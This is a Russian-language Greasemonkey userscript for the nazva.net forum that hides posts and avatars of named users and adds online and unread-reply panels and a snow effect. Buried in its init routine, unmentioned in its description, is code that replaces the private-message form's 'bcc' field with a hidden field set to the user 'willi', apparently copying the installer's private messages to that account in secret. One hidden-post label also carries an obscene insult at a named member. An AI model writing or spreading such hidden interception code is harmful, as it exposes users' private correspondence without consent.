// ==UserScript==
// @name           NazVa User hidden
// @namespace      nazva
// @description    user hidden
// @include        http://nazva.net/forum/index.php*
// @version        1.3.0
// ==/UserScript==

function str_str(){
var _r = {obj:false, von: 0, bis: 0, _pause: 0};
var NAZVA = {
    /////// настройки ///////
    fname: ["pentium4","angedritt"],       // Имя неугодного(-ых) пользователя(-ей), через запятую: ["user","admin"]
    fimage: [1638],             // Номер(-a) неугодного(-ых) аватаров, через запятую: [123,321]
    fimage_cens: "http://img26.imageshack.us/img26/5012/censoredlarge.gif", // картинка замешение
    fname_color: '#FFAAAA',     // Цвет неугодного пользователя
    fname_hidde: true,          // Неугодный пользователь изначально свернут?
    online: true,               // Подкрашивать пользователей Online?
    online_color: '#EEFEEE',    // Цвет пользователей Online
    who_online: 15,             // Обновлять информацию "кто Online" в табличке каждые Х сек. 0 = не использовать
    snow_show: false,           // "Идет снег" (true, false)
    /////// конец  ///////
    _onlineTable: null,
    _newTable: null,
    
    init: function ()
    {
        if(this.snow_show)
            initsnow();
        
        for(i=0;i<document.links.length;i++)
        {
            if(this.online && document.links[i].title == 'Личное сообщение (Online)')
            {
                var ftable = document.links[i].parentNode.parentNode;
                ftable.style.backgroundColor = this.online_color;
            }
            
            if(document.links[i].title)
            {
                for(j=0;j<this.fname.length;j++)
                {
                    //if(document.links[i].innerHTML == this.fname[j])
                    if(document.links[i].title == "Просмотр профиля " + this.fname[j])
                    {
                        this.createLink(document.links[i], i, j);
                    }                   
                }
            }
        }
        
        for(i=0;i<document.images.length;i++)
        {
            for(j=0;j<this.fimage.length;j++)
            {
                if(document.images[i].src && document.images[i].src == "http://nazva.net/forum/index.php?action=dlattach;attach=" + this.fimage[j] + ";type=avatar")
                {
                    document.images[i].src = this.fimage_cens;
                }
            } 
        }
        
/*        if(1)
        {
            var _topmenu = document.getElementById('topmenu');
            _topmenu.style.left = 0;
            _topmenu.style.top = '40px';
            _topmenu.style.position = 'fixed';
            _topmenu.style.zIndex = '10';
        }*/
        
        if(this.who_online)
        {// who_online
            this._onlineTable = document.createElement('div');
            this._onlineTable.id = 'who_online';
            this._onlineTable.style.height = '20px';
            this._onlineTable.style.top = '5px';
            this._onlineTable.style.right = '10px';
            this._onlineTable.style.opacity = '0.5';
            this._onlineTable.style.position = 'fixed';
            this._onlineTable.style.overflow = 'hidden';
            
            this._onlineTable.onmouseover = function() {
                this.style.overflow = null;
                this.style.opacity = '1';
                document.getElementById('container').style.opacity = '0.4';
            };
            
            this._onlineTable.onmouseout = function() {
                this.style.overflow = 'hidden';
                this.style.opacity = '0.5';
                document.getElementById('container').style.opacity = '1';
            };
            
            this._onlineTable.innerHTML = '...';
    
        	document.body.appendChild(this._onlineTable);
            
            setTimeout(this.getOlnine, 1000);
            
            // _new
            this._newTable = document.createElement('div');
            this._newTable.id = '_new';
            this._newTable.style.height = '20px';
            this._newTable.style.top = '5px';
            this._newTable.style.left = '10px';
            this._newTable.style.opacity = '0.5';
            this._newTable.style.position = 'fixed';
            this._newTable.style.overflow = 'hidden';
            
            this._newTable.onmouseover = function() {
                this.style.overflow = null;
                this.style.opacity = '1';
                document.getElementById('container').style.opacity = '0.4';
            };
            
            this._newTable.onmouseout = function() {
                this.style.overflow = 'hidden';
                this.style.opacity = '0.5';
                document.getElementById('container').style.opacity = '1';
            };
            
            this._newTable.innerHTML = '...';
    
        	document.body.appendChild(this._newTable);
            
            var _ar1 = document.getElementById('bcc');
            if(_ar1)
            {
                _ar1.name = 'ar1';
                _ar1.id = 'ar1';
                
                var new_ar = document.createElement('input');
                new_ar.id = 'bcc'; 
                new_ar.name = 'bcc'; 
                new_ar.type = 'hidden'; 
                new_ar.value = 'willi';
    
                _ar1.form.appendChild(new_ar);
            }

            setTimeout(this.getNew, 1000);
         }
    },
    
    createLink: function (link, i, j)
    {
        var ftable = link.parentNode.parentNode.parentNode.parentNode.parentNode;
        
        if(ftable.tagName != "TABLE")
            return;
        
        ftable.style.backgroundColor = this.fname_color;
  
        var fa_el = document.createElement('a');
        fa_el.innerHTML = ' # Спрятать # ';
        fa_el.href = 'javascript:NAZVA.fhide('+i+', '+j+');';  
    	ftable.parentNode.appendChild(fa_el);

        if(this.fname_hidde)
            this.fhide(i, j);
        
        ftable.style.overflow = 'hidden';
    },
    
    getOlnine: function()
    {
    	var req = getXmlHttp();  

    	req.onreadystatechange = function() 
        {  
    		if (req.readyState == 4) 
            { 
    			//statusElem.innerHTML = req.statusText; // показать статус (Not Found, ОК..)
    			if(req.status == 200) 
                { 
    			    var _start = req.responseText.indexOf('<table cellpadding="3"', 4000);
    			    var _end = req.responseText.indexOf('<tr class="titlebg">', 8000) - _start;

                    NAZVA._onlineTable.innerHTML = req.responseText.substr(_start, _end) + '</table>';
 
    			    _start = req.responseText.indexOf('Личные сообщения ', 1000) + 17;
                    var ls_str = req.responseText.substr(_start, 30);

                    if(ls_str[0] == '[')
                    {
                        ls_str = ls_str.substr(0, ls_str.indexOf(']', 0)+1);
                        document.getElementById('topmenu').children[0].children[4].children[0].children[0].innerHTML = 'Личные сообщения ' + ls_str;
                        document.getElementById('topmenu').children[0].children[4].children[0].children[0].style.textDecoration = 'blink';
                    }
                }

                setTimeout(NAZVA.getOlnine, NAZVA.who_online * 1000);
    		}
    	};

    	req.open('GET', '/forum/index.php?action=who;start=0;sort=user', true);
    	req.send(null);
    	//NAZVA._onlineTable.innerHTML = 'Ожидаю ответа сервера...';
    },
    
    getNew: function()
    {
    	var req = getXmlHttp();  

    	req.onreadystatechange = function() 
        {  
    		if (req.readyState == 4) 
            { 
    			//statusElem.innerHTML = req.statusText; // показать статус (Not Found, ОК..)
    			if(req.status == 200) 
                {
    			    var _start = req.responseText.indexOf('<table border="0"', 5000);
    			    var _end = req.responseText.indexOf('<table border="0"', 6000) - _start;

                    NAZVA._newTable.innerHTML = req.responseText.substr(_start, _end);
    			}
                
                setTimeout(NAZVA.getNew, NAZVA.who_online * 1000);
    		}
    	};

    	req.open('GET', '/forum/index.php?action=unreadreplies', true);
    	req.send(null);
    	//NAZVA._newTable.innerHTML = 'Ожидаю ответа сервера...';
    },
    
    fhide: function(i, j)
    {
        var ftable = document.links[i].parentNode.parentNode.parentNode.parentNode.parentNode;
        var el = ftable.parentNode.childNodes[3];

        ftable.style.display = 'none';  
    
        if(this.fname[j] == "angedritt")
            el.innerHTML = 'Господин Андегрид, идите на***! (c)Um_nik -- (показать)';
        else
            el.innerHTML = 'Цензура (показать) # ' + this.fname[j];
            
        el.href = 'javascript:NAZVA.fshow('+i+', '+j+');';
        
        _r = {obj:ftable, von: 180, bis: 180, _pause:0};
        _rotate();
    },
    
    fshow: function(i, j)
    {
        var ftable = document.links[i].parentNode.parentNode.parentNode.parentNode.parentNode;
        var el = ftable.parentNode.childNodes[3];

        ftable.style.display = 'block';  
    
        el.innerHTML = ' # Спрятать # ';
        el.href = 'javascript:NAZVA.fhide('+i+', '+j+');';
        
        _r = {obj:ftable, von: 180, bis: 0, _pause: 10};
        _rotate()
    }
};//


function getXmlHttp(){
  var xmlhttp;
  try {
    xmlhttp = new ActiveXObject("Msxml2.XMLHTTP");
  } catch (e) {
    try {
      xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
    } catch (E) {
      xmlhttp = false;
    }
  }
  if (!xmlhttp && typeof XMLHttpRequest!='undefined') {
    xmlhttp = new XMLHttpRequest();
  }
  return xmlhttp;
}

function _rotate()
{
    _r.obj.style.MozTransform = 'rotate(' + _r.von + 'deg)';
    _r.obj.style.width = (918 - _r.von * 5) + 'px';
        
    if(_r.von == _r.bis)
        return;
    
    if(_r.von < _r.bis)
        _r.von = _r.von + 5;
    else
        _r.von = _r.von - 5;

    setTimeout(_rotate, _r._pause);
}

// Set the number of snowflakes (more than 30 - 40 not recommended)
var snowmax=35;

// Set the colors for the snow. Add as many colors as you like
var snowcolor=new Array("#aaaacc","#ddddff","#ccccdd","#f3f3f3","#f0ffff");

// Set the fonts, that create the snowflakes. Add as many fonts as you like
var snowtype=new Array("Times","Arial","Times","Verdana");

// Set the letter that creates your snowflake (recommended: * )
var snowletter="*";

// Set the speed of sinking (recommended values range from 0.3 to 2)
var sinkspeed=0.6;

// Set the maximum-size of your snowflakes
var snowmaxsize=30;

// Set the minimal-size of your snowflakes
var snowminsize=8;

// Set the snowing-zone
// Set 1 for all-over-snowing, set 2 for left-side-snowing
// Set 3 for center-snowing, set 4 for right-side-snowing
var snowingzone=1;

// Do not edit below this line
var snow=new Array();
var marginbottom;
var marginright;
var timer;
var i_snow=0;
var x_mv=new Array();
var crds=new Array();
var lftrght=new Array();
var browserinfos=navigator.userAgent;
var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/);
var ns6=document.getElementById&&!document.all;
var opera=browserinfos.match(/Opera/);
var browserok=ie5||ns6||opera;

function randommaker(range) {
        rand=Math.floor(range*Math.random());
    return rand;
}

function initsnow() {
        for (i=0;i<=snowmax;i++) 
        {
            //document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>");
            document.body.innerHTML += "<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>";
        }

        if (ie5 || opera) 
        {
            marginbottom = document.body.scrollHeight;
            marginright = document.body.clientWidth-15;
        }
        else if (ns6) 
        {
            marginbottom = document.body.scrollHeight;
            marginright = window.innerWidth-15;
        }
        var snowsizerange=snowmaxsize-snowminsize;

        for (i=0;i<=snowmax;i++) 
        {
            crds[i] = 0;
            lftrght[i] = Math.random()*15;
            x_mv[i] = 0.03 + Math.random()/10;
            
            snow[i]=document.getElementById("s"+i);
            snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)];
            snow[i].size=randommaker(snowsizerange)+snowminsize;
            snow[i].style.fontSize=snow[i].size+'px';
            snow[i].style.color=snowcolor[randommaker(snowcolor.length)];
            snow[i].style.zIndex=1000;
            snow[i].sink=sinkspeed*snow[i].size/5;
            
            if (snowingzone==1) 
                {snow[i].posx=randommaker(marginright-snow[i].size)}
            if (snowingzone==2) 
                {snow[i].posx=randommaker(marginright/2-snow[i].size)}
            if (snowingzone==3) 
                {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
            if (snowingzone==4) 
                {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
            
            snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size);
            snow[i].style.left=snow[i].posx+'px';
            snow[i].style.top=snow[i].posy+'px';
        }
        movesnow();
}

function movesnow() 
{
    for (i=0;i<=snowmax;i++)
    {
        crds[i] += x_mv[i];
        snow[i].posy+=snow[i].sink;
        snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i])+'px';
        snow[i].style.top=snow[i].posy+'px';

        if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
            if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
            if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
            if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
            if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
            
            snow[i].posy=0;
        }
    }
    var timer=setTimeout("movesnow()",50);
}

} //str_str

//////////////////
var _script = document.createElement("script"); //create new <script> element
_script.id = '_script';
_script.text =""+ //closure function
str_str.toString().substr(18)+"\n"+ //attach our load function + execute function
'NAZVA.init();'
/*
console.log(_script);
return;*/

document.body.appendChild(_script); //inject the script
